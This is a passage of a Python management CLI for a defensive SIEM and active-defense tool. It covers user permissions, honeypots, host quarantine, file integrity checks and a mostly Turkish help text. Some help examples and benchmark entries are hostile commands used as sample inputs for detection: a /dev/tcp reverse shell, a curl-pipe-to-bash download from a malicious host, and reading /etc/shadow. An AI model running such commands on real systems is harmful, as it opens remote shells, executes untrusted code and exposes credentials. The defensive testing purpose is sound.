        print(f"[*] Maintenance Authorized: {'YES' if is_maint_auth else 'NO'}\n")

    else:
        roles = maintenance_manager.list_roles()
        print("\n=================================================================")
        print("       ENTERPRISE ROLE-BASED ACCESS CONTROL (RBAC) ROLES         ")
        print("=================================================================")
        print(f"{'USERNAME':<25} | {'ASSIGNED ROLE':<20} | {'MAINTENANCE ACCESS'}")
        print("-" * 65)
        for u, r in sorted(roles.items()):
            auth_str = "ALLOWED" if maintenance_manager.is_user_authorized(u) else "BLOCKED"
            print(f"{u:<25} | {r:<20} | {auth_str}")
        print("=================================================================\n")

def honeypot_cmd(action="status", port=None):
    """Inspects and manages Honeypot Decoy Traps & Port 22 SSH Protection."""
    real_ssh = getattr(config, 'REAL_SSH_PORT', 2222)
    decoy_ports = getattr(config, 'HONEYPOT_PORTS', [22, 23, 2323, 5555, 6379, 4444, 31337])
    p22_active = getattr(config, 'ENABLE_PORT_22_HONEYPOT', True)
    
    if action == "test-probe":
        target_port = port or 22
        from detection.honeypot_trap import HoneypotTrap
        hp = HoneypotTrap()
        print(f"[*] Simulating inbound scan probe on decoy Port {target_port} from simulated IP 198.51.100.99...")
        hp._handle_honeypot_intercept("198.51.100.99", target_port)
        print(f"[OK] Honeypot test complete! Check 'manage.py list-bans' or 'manage.py logs'.")

    else:
        print("\n=================================================================")
        print("       HONEYPOT DECOY TRAPS & PORT 22 DEFENSE STATUS             ")
        print("=================================================================")
        print(f"[*] Real OpenSSH Production Port  : TCP {real_ssh}")
        print(f"[*] Port 22 SSH Decoy Honeypot    : {'ACTIVE (Auto-Drop Scanner IPs)' if p22_active else 'INACTIVE'}")
        print(f"[*] Active Decoy Listener Ports   : {', '.join(str(p) for p in decoy_ports)}")
        print(f"[*] Port 22 Ban Duration          : {getattr(config, 'PORT_22_BAN_DURATION_SECONDS', 86400) // 3600} Hours (Zero-Tolerance)")
        print(f"[*] Banner Mimicry                : Active ({getattr(config, 'HONEYPOT_SSH_BANNER', '').strip()})")
        print("=================================================================\n")

def add_user_cmd(username: str, role: str = "OPERATOR", perms: str = None, desc: str = None):
    """
    Adds or provisions a new user identity with both RBAC Role and granular PBAC Permissions.
    Persists to data/user_permissions.json and data/rbac_roles.json and logs event.
    """
    from modules.permission_manager import permission_manager
    from modules.maintenance_mode import maintenance_manager
    from modules.smart_logger import smart_logger

    if not username:
        print("[-] Error: Username is required (e.g. manage.py add-user john_doe --role DEVOPS --perms rwxn)")
        return

    clean_user = username.strip()
    clean_role = (role or "OPERATOR").strip().upper()

    ROLE_DEFAULT_PERMS = {
        "ADMIN": "rwxna",
        "DEVOPS": "rwxn-",
        "OPERATOR": "rw-x-",
        "AUDITOR": "r----",
        "RESTRICTED": "r-x--"
    }

    if not perms:
        perms = ROLE_DEFAULT_PERMS.get(clean_role, "r-x--")

    # 1. Set RBAC Role
    maintenance_manager.set_user_role(clean_user, clean_role)

    # 2. Set PBAC Granular Permissions
    perm_set = permission_manager.set_user_permissions(clean_user, perms)
    fmt_perms = permission_manager.format_permissions_string(perm_set)

    # 3. Log event
    log_msg = f"User '{clean_user}' provisioned with Role '{clean_role}' and Permissions '{fmt_perms}'. (Desc: {desc or 'N/A'})"
    smart_logger.log_event("NOTICE", "USER_MGMT", "USER_IDENTITY_PROVISIONED", clean_user, log_msg)

    # 4. Formatted Display
    print("\n=================================================================")
    print("        ENTERPRISE USER IDENTITY PROVISIONED SUCCESSFULLY        ")
    print("=================================================================")
    print(f"[*] Username              : {clean_user}")
    print(f"[*] Assigned RBAC Role    : {clean_role}")
    print(f"[*] PBAC Permission Flags : {fmt_perms}")
    print(f"[*] Description / Note    : {desc or 'Standard Enterprise Account'}")
    print(f"[*] Maintenance Window    : {'ALLOWED' if maintenance_manager.is_user_authorized(clean_user) else 'RESTRICTED'}")
    print("-----------------------------------------------------------------")
    print("  ACTIVE PERMISSION CAPABILITIES:")
    print("-----------------------------------------------------------------")
    for p in ["READ", "WRITE", "EXECUTE", "NETWORK", "ADMIN"]:
        status = "[ENABLED]" if p in perm_set else "[DENIED]"
        print(f"    - {p:<10} : {status}")
    print("=================================================================\n")

def list_users_cmd():
    """Lists all configured enterprise identities with their RBAC roles and PBAC permissions."""
    from modules.permission_manager import permission_manager
    from modules.maintenance_mode import maintenance_manager

    roles = maintenance_manager.list_roles()
    perms = permission_manager.list_all_permissions()
    all_users = sorted(set(list(roles.keys()) + list(perms.keys())))

    print("\n=====================================================================================")
    print("                ENTERPRISE IDENTITY & ACCESS CONTROL MATRIX (RBAC + PBAC)            ")
    print("=====================================================================================")
    print(f"{'USERNAME':<20} | {'RBAC ROLE':<12} | {'PBAC FLAGS':<10} | {'MAINT. ACCESS':<14} | {'PERMISSIONS BREAKDOWN'}")
    print("-" * 85)
    for u in all_users:
        r = roles.get(u, "RESTRICTED")
        p_set = permission_manager.get_user_permissions(u)
        fmt = permission_manager.format_permissions_string(p_set)
        flags = fmt.split()[0] if fmt else "-----"
        verbose = fmt.split("(", 1)[1].rstrip(")") if "(" in fmt else "NONE"
        maint_str = "ALLOWED" if maintenance_manager.is_user_authorized(u) else "BLOCKED"
        print(f"{u:<20} | {r:<12} | {flags:<10} | {maint_str:<14} | {verbose}")
    print("=====================================================================================\n")

def perm_cmd(action="list", user=None, perms=None, cmd_str=None, target_user=None, target_value=None):
    """Manages Granular User Permissions (READ, WRITE, EXECUTE, NETWORK, ADMIN) across all combinations."""
    from modules.permission_manager import permission_manager
    
    user = user or target_user
    if action == "set":
        perms = perms or target_value
    elif action == "check":
        cmd_str = cmd_str or target_value
    
    if action == "set":
        if not user or not perms:
            print("[-] Error: Provide user and permissions (e.g. manage.py perm set devops rwxn)")
            return
        res = permission_manager.set_user_permissions(user, perms)
        fmt = permission_manager.format_permissions_string(res)
        print(f"[OK] Permissions for '{user}' successfully updated to: {fmt}")

    elif action == "get":
        if not user:
            print("[-] Error: Specify user (e.g. manage.py perm get devops)")
            return
        user_p = permission_manager.get_user_permissions(user)
        fmt = permission_manager.format_permissions_string(user_p)
        print(f"\n[*] User: {user}")
        print(f"[*] Active Permission Matrix: {fmt}")
        print("-----------------------------------------------------------------")
        for p in ["READ", "WRITE", "EXECUTE", "NETWORK", "ADMIN"]:
            has_p = "YES [ENABLED]" if p in user_p else "NO  [DENIED]"
            print(f"    - {p:<10}: {has_p}")
        print("-----------------------------------------------------------------\n")

    elif action == "check":
        if not user or not cmd_str:
            print("[-] Error: Provide user and command (e.g. manage.py perm check devops \"cat /etc/passwd\")")
            return
        is_allowed, missing, req = permission_manager.check_command_permission(user, cmd_str)
        user_p = permission_manager.get_user_permissions(user)
        print(f"\n=================================================================")
        print("          GRANULAR PERMISSION INSPECTION REPORT                  ")
        print("=================================================================")
        print(f"[*] Target User        : {user}")
        print(f"[*] User Permissions   : {permission_manager.format_permissions_string(user_p)}")
        print(f"[*] Command Evaluated  : {cmd_str}")
        print(f"[*] Required Perms     : {', '.join(sorted(list(req)))}")
        print(f"[*] Missing Perms      : {', '.join(sorted(list(missing))) if missing else 'None'}")
        print(f"[*] AUTHORIZATION      : {'ALLOWED [PASS]' if is_allowed else 'DENIED [BLOCKED]'}")
        print("=================================================================\n")

    else:
        # List all
        all_perms = permission_manager.list_all_permissions()
        print("\n=================================================================")
        print("       GRANULAR USER PERMISSIONS MATRIX (ALL COMBINATIONS)       ")
        print("=================================================================")
        print(f"{'USERNAME':<20} | {'FLAGS':<8} | {'ACTIVE PERMISSION SET'}")
        print("-" * 65)
        for u, p_set in sorted(all_perms.items()):
            fmt = permission_manager.format_permissions_string(p_set)
            flags = fmt.split()[0]
            verbose = fmt.split("(", 1)[1].rstrip(")") if "(" in fmt else ""
            print(f"{u:<20} | {flags:<8} | {verbose}")
        print("=================================================================\n")

def compare_users_cmd(cmd_str: str = None):
    """
    Compares the user experience and enforcement actions across different user permissions
    and roles for any given command or across standard benchmark operations.
    """
    from modules.permission_manager import permission_manager
    from modules.maintenance_mode import maintenance_manager

    personas = [
        ("auditor", "AUDITOR (Read-Only)", "r----"),
        ("intern", "INTERN / GUEST", "r-x--"),
        ("developer", "DEVELOPER (Standard Dev)", "rwxn-"),
        ("devops", "DEVOPS LEAD (Operations)", "rwxna"),
        ("admin", "SYSTEM ADMINISTRATOR (Root)", "rwxna")
    ]

    benchmark_commands = [
        ("Log Reading", "cat /var/log/syslog | grep error"),
        ("Config Edit", "nano /etc/nginx/nginx.conf"),
        ("File Deletion", "rm -rf /var/log/audit/old_logs"),
        ("Script Execution", "python3 /opt/services/worker.py"),
        ("Outbound API Call", "curl -s https://api.github.com/status"),
        ("Git Repository Sync", "git pull origin main"),
        ("Service Restart", "systemctl restart postgresql"),
        ("Root Priv-Esc", "sudo su -")
    ]

    if cmd_str:
        req = permission_manager.classify_command_requirements(cmd_str)
        req_str = ", ".join(sorted(list(req))) if req else "READ"

        print("\n" + "=" * 95)
        print(f"        COMPARATIVE USER EXPERIENCE FOR OPERATION: '{cmd_str}'")
        print("=" * 95)
        print(f"[*] Required Permission Flags: [{req_str}]")
        print("-" * 95)
        print(f"{'PERSONA / USER':<25} | {'PERMS':<8} | {'ACTION VERDICT':<18} | {'WHAT THE USER EXPERIENCES'}")
        print("-" * 95)
        for user, title, default_p in personas:
            p_set = permission_manager.get_user_permissions(user)
            if not p_set:
                p_set = permission_manager.parse_permission_flags(default_p)
            flags = permission_manager.format_permissions_string(p_set).split()[0]
            
            is_allowed, missing, _ = permission_manager.check_command_permission(user, cmd_str)
            if is_allowed:
                verdict = "[+] ALLOWED (PASS)"
                ux_msg = "Command executes normally with standard stdout/stderr."
            else:
                missing_str = ", ".join(sorted(list(missing)))
                verdict = "[-] DENIED (BLOCK)"
                ux_msg = f"Access Denied: 403 Forbidden [Missing: {missing_str}]. Logged to SOC."

            print(f"{title:<25} | {flags:<8} | {verdict:<18} | {ux_msg}")
        print("=" * 95 + "\n")

    else:
        print("\n" + "=" * 115)
        print("                    ENTERPRISE USER EXPERIENCE & PERMISSION COMPARISON MATRIX                     ")
        print("=" * 115)
        print(f"{'OPERATION CATEGORY':<20} | {'COMMAND TESTED':<35} | {'AUDITOR':<9} | {'INTERN':<9} | {'DEV':<9} | {'DEVOPS':<9} | {'ADMIN':<9}")
        print("-" * 115)

        for cat_name, cmd in benchmark_commands:
            row = [f"{cat_name:<20}", f"{cmd[:33]:<35}"]
            for user, title, default_p in personas:
                p_set = permission_manager.get_user_permissions(user)
                if not p_set:
                    p_set = permission_manager.parse_permission_flags(default_p)
                
                is_allowed, _, _ = permission_manager.check_command_permission(user, cmd)
                res_str = "[PASS]" if is_allowed else "[DENY]"
                row.append(f"{res_str:<9}")

            print(" | ".join(row))

        print("=" * 115)
        print("[*] Tip: You can test any custom command via: python manage.py compare --cmd \"<KOMUT>\"\n")

def run_virtual_mesh_cmd(speed=0.2):
    """Executes the automated virtual PC / multi-node network simulation."""
    from modules.virtual_mesh_simulator import virtual_mesh_orchestrator
    virtual_mesh_orchestrator.run_automated_simulation(speed_delay=speed)

def isolate_host_cmd(allowed=None, reason=None):
    from modules.host_containment import host_containment_manager
    allowed_list = [x.strip() for x in allowed.split(",")] if allowed else None
    st = host_containment_manager.isolate_host(allowed_ips=allowed_list, reason=reason)
    print("\n=================================================================")
    print("      EMERGENCY HOST NETWORK CONTAINMENT (QUARANTINE) ACTIVE     ")
    print("=================================================================")
    print(f"[*] Containment Status   : {st['status']}")
    print(f"[*] Reason               : {st['reason']}")
    print(f"[*] Isolated At          : {st['isolated_at']}")
    print(f"[*] Preserved Lifelines  : {', '.join(st['preserved_management_ips'])}")
    print("=================================================================\n")

def restore_host_cmd(reason=None):
    from modules.host_containment import host_containment_manager
    st = host_containment_manager.restore_host(reason=reason or "Admin Remediation Complete")
    print("\n=================================================================")
    print("        HOST NETWORK CONTAINMENT RESTORED (UNRESTRICTED)         ")
    print("=================================================================")
    print(f"[*] Containment Status   : {st['status']}")
    print(f"[*] Normal Routing       : ENABLED")
    print("=================================================================\n")

def containment_status_cmd():
    from modules.host_containment import host_containment_manager
    st = host_containment_manager.get_status()
    print("\n=================================================================")
    print("           HOST NETWORK CONTAINMENT & QUARANTINE STATUS          ")
    print("=================================================================")
    print(f"[*] Containment Status   : {st['status']}")
    print(f"[*] Active Reason        : {st['reason']}")
    print(f"[*] Isolated Since       : {st['isolated_at']}")
    print(f"[*] Duration             : {st['isolation_duration']}")
    print(f"[*] Preserved Lifelines  : {', '.join(st['preserved_management_ips'])}")
    print("=================================================================\n")

def resource_guard_cmd(action="status", limit=5):
    from modules.resource_abuse_guard import resource_abuse_guard
    if action in ["status", "top", "top-consumers"]:
        telemetry = resource_abuse_guard.get_top_resource_consumers(limit=limit)
        print("\n=================================================================")
        print("     SYSTEM RESOURCE GUARD TELEMETRY & ATTRIBUTION DASHBOARD     ")
        print("=================================================================")
        print(f"[*] Overall CPU Load    : {telemetry['system_cpu_percent']}%")
        print(f"[*] Overall RAM Load    : {telemetry['system_ram_percent']}%")
        print(f"[*] Disk Space Usage    : {telemetry['system_disk_percent']}%")
        print(f"[*] Monitored Processes : {telemetry['total_monitored_processes']}")
        print("-----------------------------------------------------------------")
        print("  TOP CPU CONSUMING PROCESSES (ATTRIBUTION BY USER & PID):")
        print("-----------------------------------------------------------------")
        print(f"{'PID':<7} {'USER':<15} {'CPU%':<7} {'MEM(MB)':<9} {'RUNTIME':<10} {'PROCESS / COMMAND'}")
        print("-" * 65)
        for p in telemetry["top_cpu_processes"]:
            print(f"{p['pid']:<7} {p['username']:<15} {p['cpu_percent']:<7} {p['memory_mb']:<9} {p['runtime_str']:<10} {p['cmdline'][:30]}")

        print("-----------------------------------------------------------------")
        print("  TOP RAM CONSUMING PROCESSES:")
        print("-----------------------------------------------------------------")
        print(f"{'PID':<7} {'USER':<15} {'RAM%':<7} {'MEM(MB)':<9} {'RUNTIME':<10} {'PROCESS / COMMAND'}")
        print("-" * 65)
        for p in telemetry["top_ram_processes"]:
            print(f"{p['pid']:<7} {p['username']:<15} {p['memory_percent']:<7} {p['memory_mb']:<9} {p['runtime_str']:<10} {p['cmdline'][:30]}")
        print("=================================================================\n")

    elif action == "scan":
        incidents = resource_abuse_guard.scan_and_remediate()
        print("\n=================================================================")
        print(f"    RESOURCE SCAN COMPLETE: {len(incidents)} INCIDENTS EVALUATED")
        print("=================================================================")
        if incidents:
            for inc in incidents:
                print(f"[*] Verdict: [{inc['verdict']}] | Action: [{inc['action']}]")
                print(f"    Target: PID {inc['pid']} (User: {inc['username']})")
                print(f"    Reason: {inc['reason']}\n")
        else:
            print("  [OK] No abusive or cryptomining processes detected.")
        print("=================================================================\n")

def fim_cmd(action="status", file_path=None):
    from detection.file_integrity_monitor import FileIntegrityMonitor
    fim = FileIntegrityMonitor()
    if action == "status":
        print("\n=================================================================")
        print("          FILE INTEGRITY MONITORING (FIM) STATUS DASHBOARD       ")
        print("=================================================================")
        print(f"[*] Total Monitored Targets: {len(fim.monitored_paths)}")
        print("-----------------------------------------------------------------")
        print(f"{'FILE PATH':<30} | {'EXISTS':<7} | {'SHA-256 BASELINE HASH'}")
        print("-" * 75)
        for p in fim.monitored_paths:
            b = fim.baselines.get(p, {})
            h = b.get("hash") or "N/A (File Missing)"
            exists_str = "YES" if b.get("exists") else "NO"
            print(f"{p:<30} | {exists_str:<7} | {h[:28]}...")
        print("=================================================================\n")

    elif action in ["rebaseline", "update"]:
        fim.update_all_baselines()
        print("[OK] FIM cryptographic baselines and file snapshots updated.")

    elif action in ["scan", "check"]:
        print("[*] Running active File Integrity Scan...")
        fim.scan_integrity()
        print("[OK] FIM Scan Complete.")

def print_enhanced_help():
    help_text = """
====================================================================================================
               ENTERPRISE SIEM & ACTIVE DEFENSE PLATFORM - CLI CONTROLLER (manage.py)               
====================================================================================================

KULLANIM (USAGE):
  python manage.py <KOMUT> [PARAMETRELER]
  python manage.py help [KOMUT]
  python manage.py --help

====================================================================================================
1. 🚀 DAEMON YÖNETİMİ & CANLI İZLEME (LIFECYCLE & MONITORING)
====================================================================================================
  start             SIEM daemon'ını başlatır.
                    Parametreler:
                      --mode {production,dry-run} : Çalışma modu (Varsayılan: production).
                      --daemon, -d                : Arka planda (detached) servis olarak çalıştırır.
                      --port PORT                 : Syslog dinleme portunu override eder.
                    Örnek: python manage.py start --daemon

  stop              Çalışan tüm SIEM daemon ve alt süreçlerini güvenle sonlandırır.
                    Örnek: python manage.py stop

  restart           SIEM daemon'ını yeniden başlatır.
                    Örnek: python manage.py restart

  audit             Daemon'ı ön planda uyarı (Warning-Only / Dry-Run) modunda başlatır.
                    Örnek: python manage.py audit

  status            Sistem genel durumunu, aktif banları ve oturumları özetler.
                    Örnek: python manage.py status

  monitor / top     Canlı interaktif terminal SOC izleme panelini açar (Htop benzeri).
                    Örnek: python manage.py monitor

  doctor            Kapsamlı sistem sağlık, veritabanı, port ve servis teşhisi çalıştırır.
                    Örnek: python manage.py doctor

====================================================================================================
2. 👥 KULLANICI, KİMLİK & YETKİ YÖNETİMİ (USER & ACCESS CONTROL - PBAC / RBAC)
====================================================================================================
  add-user          Sisteme yeni bir kullanıcı kimliği, rolü ve yetki matrisi ekler.
                    Parametreler:
                      username                    : Eklenecek kullanıcı adı (Zorunlu).
                      --role {ADMIN,DEVOPS,OPERATOR,AUDITOR,RESTRICTED} : Kullanıcının rolü.
                      --perms PERMS               : PBAC yetki bayrakları (Örn: 'rwxna', 'rwxn', 'r----', 'all').
                      --desc DESC                 : Kullanıcı açıklaması / unvanı.
                    Örnek: python manage.py add-user ahmet --role DEVOPS --perms rwxn --desc "DevOps Mühendisi"
                    Örnek: python manage.py add-user stajyer --role RESTRICTED --perms r---- --desc "Yeni Stajyer"

  list-users        Tüm kayıtlı kullanıcıları, RBAC rollerini, PBAC bayraklarını ve bakım izinlerini listeler.
                    Örnek: python manage.py list-users

  auth              Kullanıcı rol tabanlı erişim kontrolünü (RBAC) yönetir.
                    Alt komutlar: {list, set-role, check}
                    Parametreler: --user USER, --role ROLE
                    Örnek: python manage.py auth set-role --user ahmet --role ADMIN
                    Örnek: python manage.py auth check --user ahmet

  perm              Detaylı PBAC yetkilerini (READ, WRITE, EXEC, NET, ADMIN) yönetir ve test eder.
                    Alt komutlar: {list, set, get, check}
                    Parametreler: --user USER, --perms PERMS, --cmd CMD
                    Örnek: python manage.py perm set ahmet rwxn
                    Örnek: python manage.py perm check ahmet "cat /etc/passwd"
                    Örnek: python manage.py perm check stajyer "rm -rf /var/log"

  user-audit        Belirli bir kullanıcının tüm komut geçmişini ve risk denetimini listeler.
                    Örnek: python manage.py user-audit ahmet --limit 50

  sessions          Aktif SSH/terminal oturumlarını listeler veya sonlandırır.
                    Parametreler: --kill {TTY veya USERNAME}
                    Örnek: python manage.py sessions
                    Örnek: python manage.py sessions --kill pts/2

  maintenance       Bakım Modu (Maintenance Defense) kurallarını yönetir.
                    Alt komutlar: {on, off, status, allow, deny}
                    Parametreler: --reason REASON, --allowed USERS, --user USER
                    Örnek: python manage.py maintenance on --reason "Kernel Güncellemesi" --allowed admin,devops
                    Örnek: python manage.py maintenance off

====================================================================================================
3. 🛡️ GÜVENLİK DUVARI & AKTİF SAVUNMA (PERIMETER & ACTIVE DEFENSE)
====================================================================================================
  ban               Bir IP adresini veya Subnet CIDR bloğunu güvenlik duvarından engeller.
                    Parametreler:
                      ip                          : Hedef IP veya CIDR (Örn: 198.51.100.5 veya 85.90.10.0/24).
                      --duration SECONDS          : Ban süresi (saniye cinsinden).
                      --criticality {CRITICAL,HIGH,MEDIUM,LOW} : Kritiklik seviyesi.
                      --reason REASON             : Ban sebebi.
                    Örnek: python manage.py ban 198.51.100.5 --duration 3600 --reason "SSH Brute-force"

  unban             Bir IP veya CIDR bloğunun güvenlik duvarı engelini kaldırır.
                    Örnek: python manage.py unban 198.51.100.5

  unban-all         Tüm aktif güvenlik duvarı banlarını ve kısıtlamalarını temizler.
                    Örnek: python manage.py unban-all

  list-bans         Son ve aktif güvenlik duvarı banlarını listeler.
                    Parametreler: --active-only, --limit LIMIT
                    Örnek: python manage.py list-bans --active-only

  honeypot          Honeypot tuzaklarını ve Port 22 SSH korumasını yönetir / test eder.
                    Alt komutlar: {status, test-probe}
                    Örnek: python manage.py honeypot status
                    Örnek: python manage.py honeypot test-probe --port 22

  isolate-host      Acil Sıfır Güven (Zero-Trust) Ana Makine Karantinası (Host Containment).
                    Parametreler: --allow WHITELIST_IPS, --reason REASON
                    Örnek: python manage.py isolate-host --allow 192.168.1.100 --reason "Fidye Yazılımı Tespiti"

  restore-host      Ana makine ağ karantinasını kaldırır ve normal yönlendirmeyi geri yükler.
                    Örnek: python manage.py restore-host

  containment-status Ana makine ağ karantina durumunu görüntüler.
                    Örnek: python manage.py containment-status

====================================================================================================
4. 🔍 TEHDİT ANALİZİ & ALGILAMA MOTORLARI (DETECTION & THREAT INTELLIGENCE)
====================================================================================================
  scan              Herhangi bir şüpheli komut veya payload için adli tehdit analizi yapar.
                    Örnek: python manage.py scan "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
                    Örnek: python manage.py scan "cat /etc/shadow"

  cti-check         Bir IP veya alan adını Tehdit İstihbaratı (CTI) veri tabanlarında sorgular.
                    Örnek: python manage.py cti-check 185.220.101.5

  dga-check         Alan adını DGA (Domain Generation Algorithm) ve Shannon entropi ile analiz eder.
                    Örnek: python manage.py dga-check xlkjdsaf987sdf.biz

  risk              Kullanıcı veya IP için dinamik UEBA risk skorunu görüntüler veya puan ekler.
                    Parametreler: entity, --add POINTS, --reason REASON, --is-host
                    Örnek: python manage.py risk ahmet --add 25 --reason "Şüpheli mesai dışı erişim"

  memory-scan       Süreç belleğinde RWX anomalileri ve YARA imzaları taraması yapar.
                    Parametreler: --pid PID
                    Örnek: python manage.py memory-scan

  resource-guard    Sistem kaynaklarını kötüye kullanan süreçleri (Cryptominer vb.) tespit eder.
                    Alt komutlar: {status, top, scan}
                    Örnek: python manage.py resource-guard scan

  fim               Dosya Bütünlüğü İzleyicisini (FIM) yönetir ve değişiklik farklarını inceler.
                    Alt komutlar: {status, scan, rebaseline}
                    Örnek: python manage.py fim status
                    Örnek: python manage.py fim scan

====================================================================================================
5. 📜 LOGLAMA & GÜVENLİK RAPORLAMA (LOGS & INTEGRITY AUDITING)
====================================================================================================
  logs              Güvenlik ve aktivite loglarını sorgular ve filtreler.
                    Parametreler: --limit N, --level LEVEL, --event-type TYPE, --json
                    Örnek: python manage.py logs --level CRITICAL --limit 10

  tail              Canlı log akışını terminalde anlık olarak izler.
                    Parametreler: --follow, -f, --lines N
                    Örnek: python manage.py tail -f

  verify-integrity  WORM HMAC-SHA256 log zincirinin kriptografik bütünlüğünü doğrular.
                    Örnek: python manage.py verify-integrity

  export-report     SIEM metriklerini ve güvenlik durumunu JSON raporu olarak dışa aktarır.
                    Parametreler: --output DOSYA_YOLU
                    Örnek: python manage.py export-report -o guvenlik_raporu.json

====================================================================================================
6. 🧪 TEST & SİMÜLASYON (TESTING & ADVANCED SIMULATION)
====================================================================================================
  test              17 aşamalı kurumsal doğrulama test paketini çalıştırır.
                    Örnek: python manage.py test

  benchmark         25 senaryolu AI güvenlik benchmark testini çalıştırır.
                    Örnek: python manage.py benchmark

  benchmark1000     1.000 aşamalı kurumsal stres ve dayanıklılık benchmark testini çalıştırır.
                    Örnek: python manage.py benchmark1000

  benchmark10000    10.000 aşamalı büyük ölçekli stres testini çalıştırır.
                    Örnek: python manage.py benchmark10000

  simulate          Tek bir komut veya log satırı üzerinde tüm motorları simüle eder.
                    Örnek: python manage.py simulate "curl -s http://malicious.site/payload.sh | bash"

  simulate-shell    İnteraktif tehdit simülasyon konsolunu (REPL) açar.
                    Örnek: python manage.py simulate-shell

  generate-dataset  Makine öğrenmesi eğitimi için sentetik güvenlik log veri seti üretir.
                    Örnek: python manage.py generate-dataset --samples 5000

  train-models      AI Güvenlik Modellerini üretilen veri seti ile yeniden eğitir.
                    Örnek: python manage.py train-models

====================================================================================================
"""
    print(help_text)

def main():
    if len(sys.argv) > 1 and sys.argv[1] in ["help", "--help", "-h"]:
        print_enhanced_help()
        return

    parser = argparse.ArgumentParser(
        description="Enterprise SIEM Management, Testing & Interactive SOC Controller",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False
    )
    parser.add_argument("--help", "-h", action="store_true", help="Show descriptive help message")
    subparsers = parser.add_subparsers(dest="command", help="Available Operations")

    # 1. Daemon Lifecycle
    p_start = subparsers.add_parser("start", help="Start SIEM daemon")
    p_start.add_argument("--mode", type=str, default="production", choices=["production", "dry-run"], help="Operating mode")
    p_start.add_argument("--daemon", "-d", action="store_true", help="Run detached in background")
    p_start.add_argument("--port", type=int, default=None, help="Override Syslog port")

    p_stop = subparsers.add_parser("stop", help="Stop SIEM daemon")

    p_restart = subparsers.add_parser("restart", help="Restart SIEM daemon")
    p_restart.add_argument("--mode", type=str, default="production", choices=["production", "dry-run"])

    subparsers.add_parser("audit", help="Run SIEM in foreground Warning-Only / Dry-Run mode")

    # 2. Testing & Simulation
    p_test = subparsers.add_parser("test", help="Run 17-point automated verification suite")
    p_test.add_argument("--verbose", "-v", action="store_true", help="Verbose test diagnostics")

    subparsers.add_parser("benchmark", help="Run AI Security Benchmark (25 Scenarios)")
    subparsers.add_parser("benchmark1000", help="Run 1,000 Scenario Enterprise Stress-Test Benchmark")
    subparsers.add_parser("benchmark10000", help="Run 10,000 Scenario Enterprise Realistic Stress-Test Benchmark")
    p_sim = subparsers.add_parser("simulate", help="Simulate single command string evaluation")
    p_sim.add_argument("payload", type=str, help="Command string to evaluate")

    subparsers.add_parser("simulate-shell", help="Interactive threat simulation REPL")

    # 3. Logs & Observability
    subparsers.add_parser("status", help="Show system overview, bans, and active sessions")
    subparsers.add_parser("monitor", help="Live interactive terminal SOC dashboard")
    subparsers.add_parser("top", help="Alias for monitor")

    p_logs = subparsers.add_parser("logs", help="Query activity logs")
    p_logs.add_argument("--limit", type=int, default=20, help="Number of records")
    p_logs.add_argument("--level", type=str, default=None, help="Filter by severity")
    p_logs.add_argument("--event-type", type=str, default=None, help="Filter by event")
    p_logs.add_argument("--json", action="store_true", help="Print JSON")

    p_ua = subparsers.add_parser("user-audit", help="Audit user activities")
    p_ua.add_argument("user", type=str, help="Target username")
    p_ua.add_argument("--limit", type=int, default=20)

    p_tail = subparsers.add_parser("tail", help="Tail live log files")
    p_tail.add_argument("--follow", "-f", action="store_true", help="Continuous follow")
    p_tail.add_argument("--lines", "-n", type=int, default=15, help="Number of initial lines")

    p_vi = subparsers.add_parser("verify-integrity", help="Verify HMAC-SHA256 log chain integrity")
    p_vi.add_argument("--file", type=str, default="logs/activity_records.jsonl")

    p_exp = subparsers.add_parser("export-report", help="Export SIEM metrics as JSON")
    p_exp.add_argument("--output", "-o", type=str, default="siem_security_report.json")

    # 4. Security & Threat Intelligence
    p_cti = subparsers.add_parser("cti-check", help="Query CTI threat feeds for an IP or domain")
    p_cti.add_argument("target", type=str, help="IP or domain name to query")

    p_dga = subparsers.add_parser("dga-check", help="Evaluate DGA score & Shannon entropy for a domain")
    p_dga.add_argument("domain", type=str, help="Domain name to check")

    p_risk = subparsers.add_parser("risk", help="View or adjust dynamic risk score")
    p_risk.add_argument("entity", type=str, help="User or host entity name")
    p_risk.add_argument("--add", type=float, default=None, help="Points to add")
    p_risk.add_argument("--reason", type=str, default="Manual adjustment via manage.py")
    p_risk.add_argument("--is-host", action="store_true", help="Entity is a host IP rather than user")

    p_mem = subparsers.add_parser("memory-scan", help="Run process memory RWX & YARA scan")
    p_mem.add_argument("--pid", type=int, default=None, help="Target specific PID")

    # 5. Perimeter & Sessions
    p_ban = subparsers.add_parser("ban", help="Manually ban an IP or Subnet CIDR")
    p_ban.add_argument("ip", type=str, help="IP address or CIDR subnet")
    p_ban.add_argument("--duration", type=int, default=None, help="Duration in seconds")
    p_ban.add_argument("--criticality", type=str, default="CRITICAL", choices=["CRITICAL", "HIGH", "MEDIUM", "LOW"])
    p_ban.add_argument("--reason", type=str, default="Manual Administrator Ban")

    p_unban = subparsers.add_parser("unban", help="Lift firewall ban for an IP or Subnet")
    p_unban.add_argument("ip", type=str, help="Target IP or CIDR")

    subparsers.add_parser("unban-all", help="Lift all active firewall bans")

    p_lbans = subparsers.add_parser("list-bans", help="List recent and active bans")
    p_lbans.add_argument("--active-only", action="store_true", help="List only currently active unexpired bans")
    p_lbans.add_argument("--limit", type=int, default=20)

    p_sess = subparsers.add_parser("sessions", help="List or terminate active terminal sessions")
    p_sess.add_argument("--kill", type=str, default=None, help="Kill session by TTY or Username")

    subparsers.add_parser("doctor", help="Run comprehensive system health check and diagnostics")
    
    p_scan = subparsers.add_parser("scan", help="Deep-dive forensic threat inspection on any command or payload")
    p_scan.add_argument("payload", type=str, help="Command string or log to inspect")

    # 6. User Identity & PBAC / RBAC Management
    p_adduser = subparsers.add_parser("add-user", help="Provision a new user identity with RBAC role and PBAC permissions")
    p_adduser.add_argument("username", type=str, help="Username to create or configure")
    p_adduser.add_argument("--role", type=str, default="OPERATOR", choices=["ADMIN", "DEVOPS", "OPERATOR", "AUDITOR", "RESTRICTED"], help="Assigned RBAC role")
    p_adduser.add_argument("--perms", type=str, default=None, help="Granular PBAC permissions (e.g. 'rwxna', 'rwxn', 'r----')")
    p_adduser.add_argument("--desc", type=str, default=None, help="Description or job title for the user")

    subparsers.add_parser("list-users", help="List all configured enterprise users with roles and permissions")
    subparsers.add_parser("users", help="Alias for list-users")

    # 7. Tooling & Dataset Generation
    p_gdata = subparsers.add_parser("generate-dataset", help="Generate synthetic training logs")
    p_gdata.add_argument("--samples", type=int, default=5000, help="Number of log lines to generate")
    p_gdata.add_argument("--output", type=str, default="data/dataset.jsonl", help="Output file path")

